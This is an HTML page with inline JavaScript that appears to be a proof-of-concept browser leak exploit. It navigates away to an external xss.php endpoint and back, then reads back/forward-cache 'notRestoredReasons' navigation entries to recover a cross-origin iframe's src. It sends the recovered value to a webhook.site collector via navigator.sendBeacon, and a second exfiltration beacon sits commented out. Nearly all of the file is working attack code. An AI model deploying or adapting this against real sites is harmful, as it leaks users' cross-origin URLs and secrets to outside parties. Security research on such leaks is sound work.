<body onunload=console.log(1337)>
<form id="asdf" action="/">
    <input name="username" type="text">
    <input name="password" type="password">
    <input type="submit">
</form>
</body>


<iframe srcdoc='<body onunload=console.log(1337)></body>'></iframe>
<div id=x></div>
<script>
function returnNRR() {
    let nrr = [];
  const navEntries = performance.getEntriesByType("navigation");
  for (let i = 0; i < navEntries.length; i++) {
    let navEntry = navEntries[i];
    if (navEntry.notRestoredReasons) {
        nrr.push(navEntry.notRestoredReasons);
    }
  }
  return nrr;
}
i=0;
oop = setTimeout(() => {
    console.log('navigating');
    location = 'https://p.cat.ax/xss.php?js=setTimeout(()=>{history.back()}, 1000);'
}, 1000);
int = setInterval(() => {
    x.innerHTML = i++;
    
    nrr = returnNRR();
    console.log(nrr);
    //navigator.sendBeacon('https://webhook.site/f42624b4-073e-4fcd-be01-aedbf2155cec', JSON.stringify(nrr));
    leaked = nrr.find((r)=>r.children.length===2);
    if (leaked) {

        leaked = leaked.children[1].src;
        navigator.sendBeacon('https://webhook.site/894582c1-d070-4b8a-b25f-2385cbf3ba78', leaked);

        clearInterval(int);
        clearTimeout(oop);
    }
}, 500);



</script>
